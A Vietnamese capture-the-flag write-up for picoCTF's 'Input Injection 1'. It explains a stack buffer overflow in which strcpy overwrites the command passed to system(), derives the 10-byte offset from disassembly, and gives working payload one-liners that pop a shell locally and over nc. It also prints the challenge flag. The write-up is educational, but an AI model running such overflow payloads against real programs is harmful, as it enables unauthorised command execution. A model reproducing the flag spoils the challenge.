# Input Injection 1 — picoCTF Writeup

## Thông tin bài

- **Tên challenge:** Input Injection 1
- **Thể loại:** Binary Exploitation
- **Mức độ:** Medium
- **Mục tiêu:** Khai thác lỗi tràn bộ đệm để ghi đè lệnh được truyền vào `system()` và đọc flag.

---

## 1. Mã nguồn

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h> 

void fun(char *name, char *cmd);

int main() {
    char name[200];

    printf("What is your name?\n");
    fflush(stdout);

    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);

    system(c);
}
```

---

## 2. Phân tích chương trình

Trong `main()`, chương trình khai báo:

```c
char name[200];
```

Sau đó dùng:

```c
fgets(name, sizeof(name), stdin);
```

Do đó người dùng có thể nhập tối đa khoảng 199 ký tự.

Tiếp theo, chương trình gọi:

```c
fun(name, "uname");
```

Trong hàm `fun()` có hai mảng cục bộ:

```c
char c[10];
char buffer[10];
```

Sau đó chương trình thực hiện:

```c
strcpy(c, cmd);
```

Lúc này:

```text
c = "uname"
```

Tiếp theo:

```c
strcpy(buffer, name);
```

Đây là vị trí có lỗ hổng.

`buffer` chỉ có 10 byte nhưng `name` có thể dài gần 200 byte. Hàm `strcpy()` không kiểm tra kích thước vùng đích nên dữ liệu có thể tràn ra khỏi `buffer`.

Cuối cùng:

```c
system(c);
```

Bình thường lệnh được chạy là:

```bash
uname
```

Nếu ghi đè được biến `c`, ta có thể điều khiển lệnh được truyền vào `system()`.

---

## 3. Loại lỗ hổng

Lỗ hổng chính là:

```c
strcpy(buffer, name);
```

Đây là lỗi:

```text
Stack-based buffer overflow
```

Lý do:

- `buffer` là biến cục bộ của hàm `fun()`.
- Biến cục bộ này được lưu trên stack.
- `strcpy()` sao chép dữ liệu mà không giới hạn độ dài.
- Dữ liệu dài hơn 10 byte sẽ ghi ra ngoài `buffer`.

Trong challenge này, mục tiêu không cần ghi đè địa chỉ trả về. Ta chỉ cần ghi đè biến `c`, vì biến này được sử dụng trong:

```c
system(c);
```

---

## 4. Phân tích assembly bằng GDB

Disassembly của hàm `fun`:

```asm
Dump of assembler code for function fun:
   0x0000000000401276 <+0>:   endbr64
   0x000000000040127a <+4>:   push   rbp
   0x000000000040127b <+5>:   mov    rbp,rsp
   0x000000000040127e <+8>:   sub    rsp,0x30
   0x0000000000401282 <+12>:  mov    QWORD PTR [rbp-0x28],rdi
   0x0000000000401286 <+16>:  mov    QWORD PTR [rbp-0x30],rsi
   0x000000000040128a <+20>:  mov    rdx,QWORD PTR [rbp-0x30]
   0x000000000040128e <+24>:  lea    rax,[rbp-0xa]
   0x0000000000401292 <+28>:  mov    rsi,rdx
   0x0000000000401295 <+31>:  mov    rdi,rax
   0x0000000000401298 <+34>:  call   0x4010a0 <strcpy@plt>
   0x000000000040129d <+39>:  mov    rdx,QWORD PTR [rbp-0x28]
   0x00000000004012a1 <+43>:  lea    rax,[rbp-0x14]
   0x00000000004012a5 <+47>:  mov    rsi,rdx
   0x00000000004012a8 <+50>:  mov    rdi,rax
   0x00000000004012ab <+53>:  call   0x4010a0 <strcpy@plt>
   0x00000000004012b0 <+58>:  lea    rax,[rbp-0x14]
   0x00000000004012b4 <+62>:  mov    rsi,rax
   0x00000000004012b7 <+65>:  lea    rdi,[rip+0xd61]
   0x00000000004012be <+72>:  mov    eax,0x0
   0x00000000004012c3 <+77>:  call   0x4010d0 <printf@plt>
   0x00000000004012c8 <+82>:  mov    rax,QWORD PTR [rip+0x2d91]
   0x00000000004012cf <+89>:  mov    rdi,rax
   0x00000000004012d2 <+92>:  call   0x401100 <fflush@plt>
   0x00000000004012d7 <+97>:  lea    rax,[rbp-0xa]
   0x00000000004012db <+101>: mov    rdi,rax
   0x00000000004012de <+104>: call   0x4010c0 <system@plt>
   0x00000000004012e3 <+109>: nop
   0x00000000004012e4 <+110>: leave
   0x00000000004012e5 <+111>: ret
```

---

## 5. Xác định vị trí biến `c`

Đoạn assembly:

```asm
mov rdx, QWORD PTR [rbp-0x30]
lea rax, [rbp-0xa]
mov rsi, rdx
mov rdi, rax
call strcpy
```

tương ứng với:

```c
strcpy(c, cmd);
```

Trong đó:

```asm
lea rax, [rbp-0xa]
```

lấy địa chỉ của `c`.

Vì vậy:

```text
&c = rbp - 0xa
```

Nếu:

```text
rbp = 0x7fffffffdbd0
```

thì:

```text
&c = 0x7fffffffdbd0 - 0xa
   = 0x7fffffffdbc6
```

---

## 6. Xác định vị trí biến `buffer`

Đoạn assembly:

```asm
mov rdx, QWORD PTR [rbp-0x28]
lea rax, [rbp-0x14]
mov rsi, rdx
mov rdi, rax
call strcpy
```

tương ứng với:

```c
strcpy(buffer, name);
```

Trong đó:

```asm
lea rax, [rbp-0x14]
```

lấy địa chỉ của `buffer`.

Vì vậy:

```text
&buffer = rbp - 0x14
```

Với:

```text
rbp = 0x7fffffffdbd0
```

ta có:

```text
&buffer = 0x7fffffffdbd0 - 0x14
        = 0x7fffffffdbbc
```

---

## 7. Khoảng cách giữa `buffer` và `c`

Ta có:

```text
&buffer = 0x7fffffffdbbc
&c      = 0x7fffffffdbc6
```

Khoảng cách:

```text
0x7fffffffdbc6 - 0x7fffffffdbbc = 0xa = 10 byte
```

Bố cục stack:

```text
Địa chỉ thấp

0x...dbbc  buffer[0]
0x...dbbd  buffer[1]
...
0x...dbc5  buffer[9]

0x...dbc6  c[0]
0x...dbc7  c[1]
...
0x...dbcf  c[9]

0x...dbd0  saved RBP

Địa chỉ cao
```

`strcpy()` ghi dữ liệu theo hướng địa chỉ tăng dần.

Do đó:

```text
10 byte đầu  → lấp đầy buffer
byte thứ 11  → bắt đầu ghi vào c
```

---

## 8. Vai trò của RDI và RSI

Trên Linux x86-64 theo System V ABI:

```text
Tham số thứ nhất → RDI
Tham số thứ hai  → RSI
```

Khi gọi:

```c
fun(name, "uname");
```

thì lúc vừa vào `fun()`:

```text
RDI = name
RSI = cmd
```

Hai tham số này được lưu xuống stack:

```asm
mov QWORD PTR [rbp-0x28], rdi
mov QWORD PTR [rbp-0x30], rsi
```

Khi chuẩn bị gọi:

```c
strcpy(c, cmd);
```

thì compiler thay đổi lại các thanh ghi:

```text
RDI = &c
RSI = cmd
```

Trong đó:

- `RDI` chứa địa chỉ đích.
- `RSI` chứa địa chỉ nguồn.
- `strcpy()` sao chép chuỗi tại địa chỉ mà `RSI` trỏ tới sang địa chỉ mà `RDI` trỏ tới.

Tương tự với:

```c
strcpy(buffer, name);
```

ngay trước khi gọi `strcpy()`:

```text
RDI = &buffer
RSI = name
```

---

## 9. Xây dựng payload

Mục tiêu:

1. Ghi đầy 10 byte của `buffer`.
2. Ghi đè biến `c`.
3. Đặt `c` thành `/bin/sh`.
4. Khi chương trình gọi `system(c)`, nó sẽ chạy shell.

Payload:

```text
AAAAAAAAAA/bin/sh
```

Phân bố trong bộ nhớ:

```text
buffer[0..9] = AAAAAAAAAA
c[0..6]      = /bin/sh
c[7]         = \0
```

Sau khi `strcpy(buffer, name)` hoàn thành:

```text
c = "/bin/sh"
```

Do đó:

```c
system(c);
```

trở thành:

```c
system("/bin/sh");
```

---

## 10. Chạy exploit cục bộ

Có thể thử bằng:

```bash
(python3 -c 'print("A"*10 + "/bin/sh")'; cat) | ./vuln
```

Giải thích:

```bash
python3 -c 'print("A"*10 + "/bin/sh")'
```

tạo payload:

```text
AAAAAAAAAA/bin/sh
```

Phần:

```bash
cat
```

giữ đầu vào mở để tiếp tục gửi lệnh vào shell.

Dấu pipe:

```bash
|
```

chuyển đầu ra của nhóm lệnh bên trái thành đầu vào của chương trình `./vuln`.

---

## 11. Khai thác server từ xa

Lệnh sử dụng:

```bash
(python3 -c 'print("A"*10 + "/bin/sh")'; cat) | nc amiable-citadel.picoctf.net 53038
```

Kết quả:

```text
What is your name?
Goodbye, AAAAAAAAAA/bin/sh!
```

Sau khi shell được mở, chạy:

```bash
ls
```

Kết quả:

```text
flag.txt
```

Đọc flag:

```bash
cat flag.txt
```

---

## 12. Flag

```text
picoCTF{0v3rfl0w_c0mm4nd_a52a04a8}
```

---

## 13. Kết luận

Challenge có lỗi tràn bộ đệm tại:

```c
strcpy(buffer, name);
```

Do `buffer` chỉ có 10 byte nhưng đầu vào có thể dài gần 200 byte, dữ liệu tràn từ `buffer` sang biến `c`.

Biến `c` sau đó được truyền trực tiếp vào:

```c
system(c);
```

Payload:

```text
AAAAAAAAAA/bin/sh
```

làm cho:

```text
c = "/bin/sh"
```

và chương trình thực thi shell.

Chuỗi khai thác:

```text
Input dài
→ tràn buffer
→ ghi đè c
→ system(c)
→ mở /bin/sh
→ đọc flag
```
